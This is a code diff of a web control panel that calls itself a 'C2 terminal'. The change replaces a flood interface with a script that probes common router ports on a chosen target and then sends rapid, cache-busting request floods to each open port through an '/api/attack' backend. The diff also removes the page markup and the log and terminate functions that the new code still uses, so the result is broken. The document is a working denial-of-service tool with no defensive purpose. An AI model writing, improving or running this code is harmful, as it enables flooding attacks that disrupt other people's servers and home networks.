@@ -1,125 +1,54 @@
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-    <meta charset="UTF-8">
-    <title>⚡ VERCEL EDGE COMMANDER</title>
-    <style>
-        :root { --neon: #00ff41; --bg: #050505; --warn: #ff3e3e; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        .header { border-bottom: 2px solid var(--neon); padding-bottom: 10px; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); }
-        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
-        .full-width { grid-column: span 2; }
-        label { display: block; margin-bottom: 5px; font-size: 0.8em; color: #888; }
-        input, select { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; width: 100%; box-sizing: border-box; font-size: 1.1em; outline: none; }
-        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
-        button { flex: 1; padding: 15px; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; font-size: 1em; }
-        #startBtn { background: var(--neon); color: #000; }
-        #stopBtn { background: var(--warn); color: #fff; opacity: 0.5; cursor: not-allowed; }
-        #startBtn:hover { box-shadow: 0 0 20px var(--neon); }
-        #terminal { flex-grow: 1; background: #000; border: 1px solid #222; margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; border-radius: 5px; box-shadow: inset 0 0 10px #000; }
-        .log-entry { margin-bottom: 4px; border-left: 3px solid var(--neon); padding-left: 8px; animation: scan 0.2s ease-out; }
-        .log-err { color: var(--warn); border-left-color: var(--warn); }
-        @keyframes scan { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
-        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 0.9em; color: #888; }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>[ EDGE-FLOW C2 TERMINAL v3.5 ]</h1>
-        <div class="stats">
-            <span>STATUS: <span id="statusText">READY</span></span>
-            <span>TOTAL SHOTS: <span id="shotCount">0</span></span>
-        </div>
-    </div>
+<script>
+    let attackInterval = null;
+    let totalShots = 0;
+    const commonPorts = [80, 443, 8080, 8443, 1900, 5000, 8888, 3000]; // 공유기 주요 급소
 
-    <div class="controls">
-        <div class="full-width">
-            <label>TARGET ADDRESS (URL/IP)</label>
-            <input type="text" id="target" value="http://" placeholder="http://1.2.3.4">
-        </div>
-        <div>
-            <label>FIRE RATE (INTERVAL ms)</label>
-            <select id="rate">
-                <option value="500">Normal (500ms)</option>
-                <option value="200">Fast (200ms)</option>
-                <option value="100" selected>Turbo (100ms)</option>
-                <option value="50">INSANE (50ms)</option>
-            </select>
-        </div>
-        <div>
-            <label>POWER (THREADS)</label>
-            <select id="threads">
-                <option value="1">Low (1x)</option>
-                <option value="5">Medium (5x)</option>
-                <option value="10" selected>High (10x)</option>
-            </select>
-        </div>
-    </div>
+    async function scanAndFire() {
+        const baseTarget = document.getElementById('target').value.replace(/\/$/, "");
+        log("🔍 AUTO SCANNING TARGET PORTS...");
 
-    <div class="btn-group">
-        <button id="startBtn" onclick="initiate()">MISSION START</button>
-        <button id="stopBtn" onclick="terminate()">EMERGENCY STOP</button>
-    </div>
+        // 1. 유효한 포트 찾기 (병렬 스캔)
+        const openPorts = [];
+        await Promise.all(commonPorts.map(async (port) => {
+            try {
+                const controller = new AbortController();
+                const id = setTimeout(() => controller.abort(), 1500); // 1.5초 내 응답 없으면 패스
+                await fetch(`${baseTarget}:${port}`, { mode: 'no-cors', signal: controller.signal });
+                openPorts.push(port);
+                log(`[FOUND] PORT ${port} IS RESPONSIVE`);
+            } catch (e) { /* ignore closed */ }
+        }));
 
-    <div id="terminal">>> SYSTEM INITIALIZED... WAITING FOR TARGET...</div>
-
-    <script>
-        let attackInterval = null;
-        let totalShots = 0;
-
-        function log(msg, isError = false) {
-            const term = document.getElementById('terminal');
-            const div = document.createElement('div');
-            div.className = `log-entry ${isError ? 'log-err' : ''}`;
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            term.prepend(div);
-            if (term.childNodes.length > 50) term.removeChild(term.lastChild);
+        // 2. 타격 시작
+        if (openPorts.length === 0) {
+            log("⚠️ NO SPECIFIC PORTS FOUND. DEFAULTING TO HTTP...", true);
+            openPorts.push(80);
         }
 
-        async function initiate() {
-            const target = document.getElementById('target').value;
-            const rate = parseInt(document.getElementById('rate').value);
-            const threads = parseInt(document.getElementById('threads').value);
+        startAttack(baseTarget, openPorts);
+    }
 
-            if (!target.startsWith('http')) {
-                log("ERROR: INVALID TARGET PROTOCOL", true);
-                return;
-            }
+    function startAttack(baseTarget, ports) {
+        const rate = parseInt(document.getElementById('rate').value);
+        const threads = parseInt(document.getElementById('threads').value);
+        
+        document.getElementById('statusText').innerText = "LOCK-ON FIRING";
+        document.getElementById('statusText').style.color = "red";
 
-            document.getElementById('startBtn').disabled = true;
-            document.getElementById('startBtn').style.opacity = "0.5";
-            document.getElementById('stopBtn').disabled = false;
-            document.getElementById('stopBtn').style.opacity = "1";
-            document.getElementById('statusText').innerText = "FIRING...";
-            document.getElementById('statusText').style.color = "red";
-
-            log(`INITIATING ATTACK ON ${target}...`);
-            log(`MODE: ${threads} THREADS / ${rate}ms INTERVAL`);
-
-            attackInterval = setInterval(() => {
+        attackInterval = setInterval(() => {
+            ports.forEach(port => {
                 for(let i=0; i < threads; i++) {
-                    fetch(`/api/attack?target=${target}`)
-                        .then(res => res.text())
-                        .then(data => {
+                    const finalUrl = `${baseTarget}:${port}?cache=${Math.random()}`;
+                    fetch(`/api/attack?target=${encodeURIComponent(finalUrl)}`)
+                        .then(() => {
                             totalShots += 1000;
                             document.getElementById('shotCount').innerText = totalShots.toLocaleString();
-                            log(`SUCCESS: 1,000 PKTS DELIVERED`);
-                        })
-                        .catch(e => log("PACKET DROPPED (TARGET BUSY)", true));
+                        }).catch(() => {});
                 }
-            }, rate);
-        }
-
-        function terminate() {
-            clearInterval(attackInterval);
-            document.getElementById('startBtn').disabled = false;
-            document.getElementById('startBtn').style.opacity = "1";
-            document.getElementById('stopBtn').disabled = true;
-            document.getElementById('stopBtn').style.opacity = "0.5";
-            document.getElementById('statusText').innerText = "READY";
-            document.getElementById('statusText').style.color = "var(--neon)";
-            log("!!! MISSION TERMINATED BY OPERATOR !!!", true);
-        }
-    </script>
-</body>
-</html>
+            });
+        }, rate);
+        log(`🚀 MULTI-PORT ATTACK STARTED ON: ${ports.join(", ")}`);
+    }
+    
+    // 기존 terminate 함수 유지
+</script>
